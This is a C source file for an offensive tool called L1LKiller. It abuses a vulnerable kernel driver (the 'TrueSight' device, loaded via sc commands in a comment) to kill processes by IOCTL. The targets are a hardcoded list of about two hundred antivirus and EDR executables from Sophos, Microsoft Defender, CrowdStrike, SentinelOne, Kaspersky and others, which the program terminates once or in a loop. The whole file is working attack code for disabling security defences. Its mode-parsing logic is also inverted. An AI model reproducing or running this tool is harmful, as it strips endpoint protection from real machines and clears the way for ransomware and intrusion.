#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

/*
[START DRIVER SERVICE IN cmd.exe]
sc create l1lkiller binPath="C:\Windows\Temp\L1LKiller.sys" type=kernel
sc start l1lkiller
*/

#define TERMINATE_PROCESS_IOCTL_CODE 0x22e044

const wchar_t* blackListProcess[] = {
    L"SophosOsquery.exe",
    L"SSPService.exe",
    L"SophosNtpService.exe",
    L"SophosNetFilter.exe",
    L"SophosLiveQueryService.exe",
    L"SophosHealth.exe",
    L"SophosFS.exe",
    L"SophosFIMService.exe",
    L"SophosFileScanner.exe",
    L"Sophos UI.exe",
    L"SEDService.exe",
    L"MsMpEng.exe",
    L"hmpalert.exe",
    L"aciseagent.exe",
    L"acnamagent.exe",
    L"acnamlogonagent.exe",
    L"active_protection_service.exe",
    L"acumbrellaagent.exe",
    L"AgentSvc.exe",
    L"AGMService.exe",
    L"AGSService.exe",
    L"ALMon.exe",
    L"ALsvc.exe",
    L"Arrakis3.exe",
    L"aswEngSrv.exe",
    L"aswidsagent.exe",
    L"aswToolsSvc.exe",
    L"avastsvc.exe",
    L"AvastSvc.exe",
    L"avastui.exe",
    L"AvastUI.exe",
    L"avgnt.exe",
    L"avguard.exe",
    L"avp.exe",
    L"avpsus.exe",
    L"avpui.exe",
    L"axcrypt.exe",
    L"bdagent.exe",
    L"BDAvScanner.exe",
    L"bdemsrv.exe",
    L"BDFileServer.exe",
    L"BDFsTray.exe",
    L"bdlived2.exe",
    L"BDLogger.exe",
    L"bdlserv.exe",
    L"bdntwrk.exe",
    L"bdredline.exe",
    L"bdregsvr2.exe",
    L"BDScheduler.exe",
    L"bdservicehost.exe",
    L"BDStatistics.exe",
    L"carbonsensor.exe",
    L"cbcomms.exe",
    L"ccsvchst.exe",
    L"ccSvcHst.exe",
    L"CertificationManagerServiceNT.exe",
    L"CNTAoSMgr.exe",
    L"concentr.exe",
    L"coreServiceShell.exe",
    L"cpd.exe",
    L"cpx.exe",
    L"csfalconcontainer.exe",
    L"csfalcondaterepair.exe",
    L"csfalconservice.exe",
    L"cybereason.exe",
    L"cytomicendpoint.exe",
    L"CyveraConsole.exe",
    L"CyveraService.exe",
    L"CyvrAgentSvc.exe",
    L"CyvrFsFlt.exe",
    L"DarktraceTSA.exe",
    L"DbServer.exe",
    L"dlpagent.exe",
    L"dlpsensor.exe",
    L"dsmonitor.exe",
    L"dwengine.exe",
    L"ebloader.exe",
    L"edpa.exe",
    L"eegoservice.exe",
    L"egui.exe",
    L"eguiProxy.exe",
    L"ekrn.exe",
    L"epconsole.exe",
    L"ephost.exe",
    L"EPIntegrationService.exe",
    L"EPProtectedService.exe",
    L"EPSecurityService.exe",
    L"EPUpdateService.exe",
    L"EraAgentSvc.exe",
    L"ESClient.exe",
    L"ESEFrameworkHost.exe",
    L"ESEServiceShell.exe",
    L"firesvc.exe",
    L"firetray.exe",
    L"fortiedr.exe",
    L"fw.exe",
    L"Healthservice.exe",
    L"HealthService.exe",
    L"hips.exe",
    L"hmpalert.exe",
    L"iCRCService.exe",
    L"iVPAgent.exe",
    L"kavfs.exe",
    L"kavfsscs.exe",
    L"kavfswh.exe",
    L"kavfswp.exe",
    L"kavtray.exe",
    L"klactprx.exe",
    L"klcsweb.exe",
    L"klnagent.exe",
    L"klserver.exe",
    L"klwtblfs.exe",
    L"kpf4ss.exe",
    L"ksde.exe",
    L"ksdeui.exe",
    L"LWCSService.exe",
    L"macmnsvc.exe",
    L"ManagementAgentNT.exe",
    L"masvc.exe",
    L"mbamservice.exe",
    L"MBAMService.exe",
    L"mbamtray.exe",
    L"McsAgent.exe",
    L"McsClient.exe",
    L"mcshield.exe",
    L"mdecryptservice.exe",
    L"mfeann.exe",
    L"mfeepehost.exe",
    L"mfefire.exe",
    L"mfemactl.exe",
    L"mfemms.exe",
    L"MgntSvc.exe",
    L"MonitoringHost.exe",
    L"MSASCui.exe",
    L"msascuil.exe",
    L"MSASCuiL.exe",
    L"MsMpEng.exe",
    L"msseces.exe",
    L"mssense.exe",
    L"nissrv.exe",
    L"nortonsecurity.exe",
    L"npemclient3.exe",
    L"NPMDAgent.exe",
    L"ns.exe",
    L"nsservice.exe",
    L"NTRTScan.exe",
    L"ofcDdaSvr.exe",
    L"OfcService.exe",
    L"openvpnserv.exe",
    L"outpost.exe",
    L"panda_url_filtering.exe",
    L"pangps.exe",
    L"pavfnsvr.exe",
    L"pavsrv.exe",
    L"PccNt.exe",
    L"PccNTMon.exe",
    L"psanhost.exe",
    L"PSANHost.exe",
    L"PSUAMain.exe",
    L"PSUAService.exe",
    L"RouterNT.exe",
    L"rtvscan.exe",
    L"SAVAdminService.exe",
    L"SavApi.exe",
    L"savservice.exe",
    L"SavService.exe",
    L"SBAMSvc.exe",
    L"SBAMTray.exe",
    L"sbiesvc.exe",
    L"SBPIMSvc.exe",
    L"sdcservice.exe",
    L"SEDService.exe",
    L"SentinelAgent.exe",
    L"SentinelAgentWorker.exe",
    L"SentinelCtl.exe",
    L"Sentinel.exe",
    L"SentinelHelperService.exe",
    L"SentinelServiceHost.exe",
    L"SentinelStaticEngine.exe",
    L"SentinelStaticEngineScanner.exe",
    L"SentinelUI.exe",
    L"shstat.exe",
    L"SLDService.exe",
    L"Smc.exe",
    L"SmcGui.exe",
    L"SMSvcHost.exe",
    L"SonicWallClientProtectionService.exe",
    L"SophosADSyncService.exe",
    L"sophosav.exe",
    L"SophosClean.exe",
    L"SophosCleanM64.exe",
    L"SophosFileScanner.exe",
    L"SophosFIMService.exe",
    L"SophosFS.exe",
    L"SophosHealth.exe",
    L"SophosLiveQueryService.exe",
    L"SophosMTR.exe",
    L"SophosMTRExtension.exe",
    L"SophosNetFilter.exe",
    L"SophosNtpService.exe",
    L"SophosOsquery.exe",
    L"SophosOsqueryExtension.exe",
    L"Sophos.PolicyEvaluation.Service.exe",
    L"SophosSafestore64.exe",
    L"sophossps.exe",
    L"sophosui.exe",
    L"Sophos UI.exe",
    L"SophosUI.exe",
    L"SophosUpdateMgr.exe",
    L"soyuz.exe",
    L"SRService.exe",
    L"SrvLauncher.exe",
    L"SSPService.exe",
    L"SUMService.exe",
    L"svcGenericHost.exe",
    L"swc_service.exe",
    L"swi_fc.exe",
    L"swi_filter.exe",
    L"swi_service.exe",
    L"sysmon64.exe",
    L"sysmon.exe",
    L"tanclient.exe",
    L"TelemetryService.exe",
    L"ThreatLockerConsent.exe",
    L"threatlockerservice.exe",
    L"threatlockertray.exe",
    L"TMBMSRV.exe",
    L"TmCCSF.exe",
    L"tmicAgentSetting.exe",
    L"TmListen.exe",
    L"tmntsrv.exe",
    L"TmPfw.exe",
    L"tmproxy.exe",
    L"TmsaInstance64.exe",
    L"TmSSClient.exe",
    L"trapsagent.exe",
    L"trapsd.exe",
    L"Traps.exe",
    L"truecrypt.exe",
    L"uiWinMgr.exe",
    L"updatesrv.exe",
    L"VGAuthService.exe",
    L"VipreAAPSvc.exe",
    L"VipreNis.exe",
    L"vpnagent.exe",
    L"vpnui.exe",
    L"vsserv.exe",
    L"windefend.exe",
    L"winlogbeat.exe",
    L"wireguard.exe",
    L"wrsa.exe",
    L"xagt.exe",
};

VOID Banner() {
    printf(R"EOF(
      __   _____    __ __ _ ____         
     / /  <  / /   / //_/(_) / /__  _____
    / /   / / /   / ,<  / / / / _ \/ ___/
   / /___/ / /___/ /| |/ / / /  __/ /    
  /_____/_/_____/_/ |_/_/_/_/\___/_/     
                                       
            [Coded by MrEmpy]
                 [v1.0]

)EOF");
}

VOID Help(char* progname) {
    Banner();
    printf(R"EOF(Usage: %s [OPTIONS]
    Options:
      single,                   kill processes only once
      loop,                     kill processes in a loop

    Examples:
      L1LKiller.exe single
      L1LKiller.exe loop
)EOF", progname);
}

VOID Arguments(int argc, char* argv[], int* mode) {
    if (argv[1] == NULL) {
        Help(argv[0]);
        exit(0);
    }

    if (strncmp(argv[1], "single", sizeof("single"))) {
        *mode = 1;
    }
    else if (strncmp(argv[1], "loop", sizeof("loop"))) {
        *mode = 0;
    }
}

BOOL CheckProcess(DWORD processId) {
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
    if (processHandle != NULL) {
        CloseHandle(processHandle);
        return TRUE;
    }
    return FALSE;
}

DWORD GetPID(LPCWSTR pn)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!lstrcmpiW((LPCWSTR)pE.szExeFile, pn))
                {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    if (!CheckProcess(procId)) {
        procId = 0;
    }
    return (procId);
}

int main(int argc, char* argv[]) {
    int mode;
    Arguments(argc, argv, &mode);

    HANDLE deviceHandle = CreateFileA("\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (deviceHandle == INVALID_HANDLE_VALUE) {
        puts("[-] Failed to open driver");
        return 1;
    }

    DWORD bytesReturned;
    puts("[*] Terminating processes");

    if (mode == 0) {
        for (int i = 0; i < sizeof(blackListProcess) / sizeof(blackListProcess[0]); i++) {
            DWORD processId = GetPID(blackListProcess[i]);
            if (processId != 0) {
                if (!DeviceIoControl(deviceHandle, TERMINATE_PROCESS_IOCTL_CODE, &processId, sizeof(DWORD), NULL, 0, &bytesReturned, NULL)) {
                    printf("[-] Failed to terminate process: 0x%X [%ls]\n", GetLastError(), blackListProcess[i]);
                }
                else {
                    printf("[+] Process terminated: %ls\n", blackListProcess[i]);
                }
            }
        }
    }
    else if (mode == 1) {
        while (1) {
            for (int i = 0; i < sizeof(blackListProcess) / sizeof(blackListProcess[0]); i++) {
                DWORD processId = GetPID(blackListProcess[i]);
                if (processId != 0) {
                    if (!DeviceIoControl(deviceHandle, TERMINATE_PROCESS_IOCTL_CODE, &processId, sizeof(DWORD), NULL, 0, &bytesReturned, NULL)) {
                        printf("[-] Failed to terminate process: 0x%X [%ls]\n", GetLastError(), blackListProcess[i]);
                    }
                }
            }
        }
    }

    CloseHandle(deviceHandle);
    puts("[+] Processes closed!");
    return 0;
}
